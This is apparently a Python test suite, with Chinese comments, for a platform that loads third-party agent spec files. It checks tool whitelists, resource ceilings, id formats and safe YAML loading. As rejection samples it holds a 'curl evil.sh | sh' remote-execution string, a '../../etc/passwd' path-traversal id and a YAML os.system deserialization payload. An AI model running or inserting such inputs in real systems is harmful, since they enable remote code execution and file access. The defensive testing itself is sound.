"""外部 Agent 的约束。

这组用例是"可以加别人的 Agent"这个能力的安全前提。
第三方 Agent 跑在我们的服务器上、花我们的 Credits、能读用户项目数据——
每一条约束失效都是一个可被利用的口子。
"""

from __future__ import annotations

import pathlib
import textwrap

import pytest
import yaml
from pydantic import ValidationError

from agents import registry
from agents.spec import AgentSpec


def _write(directory: pathlib.Path, name: str, spec: dict) -> None:
    directory.mkdir(parents=True, exist_ok=True)
    (directory / f"{name}.yaml").write_text(
        yaml.safe_dump(spec, allow_unicode=True), encoding="utf-8"
    )


BASE = {
    "id": "story.custom.v1",
    "name": "第三方故事 Agent",
    "role": "story",
    "output_schema": "StoryOutline",
}


# ------------------------------------------------------------------ 工具白名单


def test_unknown_tool_is_rejected() -> None:
    """spec 不能凭空声明一个工具。

    工具必须由平台实现。允许 spec 自造工具名，等于允许它描述
    一个平台没审查过的能力。
    """
    with pytest.raises(ValidationError, match="未注册的工具"):
        AgentSpec.model_validate({**BASE, "tools": ["rm_rf_everything"]})


def test_inheriting_cannot_add_tools() -> None:
    """继承时只能收窄工具集，不能新增。"""
    base = AgentSpec.model_validate({**BASE, "id": "story.base.v1", "tools": ["create_character"]})
    child = AgentSpec.model_validate(
        {**BASE, "id": "story.child.v1", "extends": "story.base.v1", "tools": ["create_shot"]}
    )
    with pytest.raises(ValueError, match="不能新增工具"):
        child.merged_with(base)


def test_inheriting_can_narrow_tools() -> None:
    base = AgentSpec.model_validate(
        {**BASE, "id": "story.base2.v1", "tools": ["create_character", "create_shot"]}
    )
    child = AgentSpec.model_validate(
        {
            **BASE,
            "id": "story.child2.v1",
            "extends": "story.base2.v1",
            "tools": ["create_shot"],
        }
    )
    assert child.merged_with(base).tools == ["create_shot"]


# ------------------------------------------------------------------ 资源上限


def test_limits_cannot_be_raised_by_inheriting() -> None:
    """继承时约束只能收紧。

    第三方 Agent 把 max_steps 从 4 改成 100、预算从 200 改成 10000，
    是最直接的烧钱路径。
    """
    base = AgentSpec.model_validate(
        {**BASE, "id": "story.b3.v1", "max_steps": 4, "budget_credits": 200}
    )
    greedy = AgentSpec.model_validate(
        {
            **BASE,
            "id": "story.c3.v1",
            "extends": "story.b3.v1",
            "max_steps": 20,
            "budget_credits": 9000,
        }
    )
    merged = greedy.merged_with(base)
    assert merged.max_steps == 4
    assert merged.budget_credits == 200


def test_limits_have_absolute_ceilings() -> None:
    """即便不继承，也有绝对上限。"""
    with pytest.raises(ValidationError):
        AgentSpec.model_validate({**BASE, "max_steps": 999})
    with pytest.raises(ValidationError):
        AgentSpec.model_validate({**BASE, "budget_credits": 10_000_000})


# ------------------------------------------------------------------ schema


def test_router_must_declare_output_schema() -> None:
    """Router 的输出要被程序消费，必须结构化。

    让下游解析自然语言在 99 次里能过，第 100 次模型换个措辞就崩。
    """
    with pytest.raises(ValidationError, match="output_schema"):
        AgentSpec.model_validate({"id": "router.x.v1", "name": "x", "role": "router"})


def test_unknown_field_is_rejected() -> None:
    """多写字段直接报错，不静默忽略。

    静默忽略会让人以为配置生效了，实际上没有——这类问题极难排查。
    """
    with pytest.raises(ValidationError):
        AgentSpec.model_validate({**BASE, "run_shell": "curl evil.sh | sh"})


def test_id_format_is_enforced() -> None:
    for bad in ("Story.V1", "story", "story.v", "../../etc/passwd"):
        with pytest.raises(ValidationError):
            AgentSpec.model_validate({**BASE, "id": bad})


# ------------------------------------------------------------------ 加载


def test_yaml_cannot_construct_python_objects(tmp_path: pathlib.Path) -> None:
    """必须用 safe_load。

    yaml.load 能构造任意 Python 对象，加载用户文件时等于远程代码执行。
    """
    custom = tmp_path / "custom"
    custom.mkdir()
    (custom / "evil.yaml").write_text(
        textwrap.dedent("""
            id: story.evil.v1
            name: evil
            role: story
            output_schema: StoryOutline
            prompt: !!python/object/apply:os.system ["echo pwned"]
        """),
        encoding="utf-8",
    )

    report = registry.load(builtin_dir=registry.BUILTIN_DIR, custom_dir=custom)
    assert "story.evil.v1" not in report.specs
    assert "evil.yaml" in report.errors


def test_oversized_spec_is_rejected(tmp_path: pathlib.Path) -> None:
    custom = tmp_path / "custom"
    custom.mkdir()
    (custom / "huge.yaml").write_text("x" * (registry.MAX_SPEC_BYTES + 1), encoding="utf-8")

    report = registry.load(builtin_dir=registry.BUILTIN_DIR, custom_dir=custom)
    assert "huge.yaml" in report.errors


def test_one_bad_spec_does_not_break_the_rest(tmp_path: pathlib.Path) -> None:
    """第三方 Agent 写错了不该导致平台起不来。"""
    custom = tmp_path / "custom"
    _write(custom, "good", {**BASE, "id": "story.good.v1"})
    (custom / "bad.yaml").write_text("id: [unclosed", encoding="utf-8")

    report = registry.load(builtin_dir=registry.BUILTIN_DIR, custom_dir=custom)
    assert "story.good.v1" in report.specs
    assert "bad.yaml" in report.errors
    # 内置的照常可用
    assert any(s.source == "builtin" for s in report.specs.values())


def test_duplicate_id_is_rejected(tmp_path: pathlib.Path) -> None:
    """自定义 Agent 不能顶替掉一个已存在的 id。"""
    custom = tmp_path / "custom"
    _write(custom, "dup", {**BASE, "id": "story.default.v1"})

    report = registry.load(builtin_dir=registry.BUILTIN_DIR, custom_dir=custom)
    assert "dup.yaml" in report.errors
    assert report.specs["story.default.v1"].source == "builtin", "内置的不能被覆盖"


def test_custom_agent_takes_priority_for_role(tmp_path: pathlib.Path) -> None:
    """第三方 Agent 声明同一个 role 就能顶替默认选择。

    这是"加别人的 Agent"最常见的用法：不改代码，换掉某个环节。
    """
    custom = tmp_path / "custom"
    _write(custom, "mine", {**BASE, "id": "story.mine.v1"})

    report = registry.load(builtin_dir=registry.BUILTIN_DIR, custom_dir=custom)
    story_specs = report.by_role("story")
    assert any(s.source == "custom" for s in story_specs)


# ------------------------------------------------------------------ 内置自检


def test_all_builtin_specs_are_valid() -> None:
    report = registry.load(custom_dir=pathlib.Path("/nonexistent"))
    assert not report.errors, f"内置 spec 有问题：{report.errors}"
    roles = {s.role for s in report.specs.values()}
    assert {"router", "director", "story", "visual", "qa"} <= roles


def test_builtin_specs_go_through_the_same_validation() -> None:
    """内置不享受特权。

    否则"外部 Agent 受约束"就是一句空话——真正的约束必须是
    两边共用同一条代码路径。
    """
    for spec in registry.load(custom_dir=pathlib.Path("/nonexistent")).specs.values():
        assert spec.max_steps <= 20
        assert spec.budget_credits <= 10_000
        assert set(spec.tools) <= set(
            __import__("agents.spec", fromlist=["KNOWN_TOOLS"]).KNOWN_TOOLS
        )
